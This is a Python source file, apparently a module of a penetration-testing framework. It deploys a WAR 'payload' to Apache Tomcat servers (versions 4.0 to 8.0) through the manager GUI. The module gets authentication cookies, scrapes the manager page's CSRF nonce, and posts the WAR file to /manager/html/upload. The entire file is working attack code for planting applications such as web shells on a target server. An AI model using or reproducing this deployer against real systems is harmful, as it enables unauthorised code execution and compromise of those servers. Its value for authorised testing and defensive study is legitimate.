from src.platform.tomcat.interfaces import TINTERFACES
from src.platform.tomcat.authenticate import checkAuth
from src.module.deploy_utils import parse_war_path
from requests.utils import dict_from_cookiejar
from requests import exceptions
from re import findall
from log import LOG
import utility

versions = ['4.0', '4.1', '5.0', '5.5', '6.0', '7.0', '8.0']
title = TINTERFACES.MAN
def deploy(fingerengine, fingerprint):
    """ This deployer is slightly different than manager_deploy in
    that it only requires the manager-gui role.  This requires us
    to deploy like one would via the web interface. 
    """

    base = 'http://{0}:{1}'.format(fingerengine.options.ip, fingerprint.port)
    uri = '/manager/html/upload'
    war_file = fingerengine.options.deploy
    war_path = parse_war_path(war_file)
    cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                        fingerprint.title, fingerprint.version)
    if not cookies:
        utility.Msg("Could not get auth for %s:%s" %
                        (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
        return

    utility.Msg("Preparing to deploy {0}...".format(war_file))

    if fingerprint.version in ['6.0', '7.0', '8.0']:
        # deploying via the gui requires a CSRF token
        (csrf, c) = fetchCSRF(base, cookies)
        if not csrf:
            return
        else:
            # set CSRF and refresh session id
            uri += '?org.apache.catalina.filters.CSRF_NONCE={0}'
            uri = uri.format(csrf)
            cookies = (c, cookies[1])

    # read in payload
    try:
        tag = 'deployWar'
        if fingerprint.version in ['4.0', '4.1']:
            tag = 'installWar'
        files = {tag : (war_path + '.war', open(war_file, 'rb'))}
    except Exception, e:
        utility.Msg(e, LOG.ERROR)
        return

    # deploy
    response = utility.requests_post(base + uri, files=files, cookies=cookies[0],
                                                              auth=cookies[1])

    if response.status_code is 200 and "OK" in response.content:
        utility.Msg("Deployed {0} to /{1}".format(war_file, war_path), LOG.SUCCESS)
    elif 'Application already exists' in response.content:
        utility.Msg("Application {0} is already deployed".format(war_file), LOG.ERROR)
    elif response.status_code is 403:
        utility.Msg("This account does not have permissions to remotely deploy.  Try"\
                    " using manager_deploy", LOG.ERROR)
    else:
        utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)


def fetchCSRF(url, cookies):
    """ Fetch and return a tuple of the CSRF token and the
    refreshed session ID
    """

    response = None
    try:
        csrf = None
        uri = '/manager/html'
        response = utility.requests_get(url + uri, cookies=cookies[0],
                                                   auth=cookies[1])

        if response.status_code is 200:

            data = findall('CSRF_NONCE=(.*?)\"', response.content)
            if len(data) > 0:
                csrf = data[0]

    except Exception, e:
        utility.Msg("Failed to fetch CSRF token (HTTP %d)" % response.status_code,
                                                             LOG.ERROR)
        csrf = None

    return (csrf, dict_from_cookiejar(response.cookies))
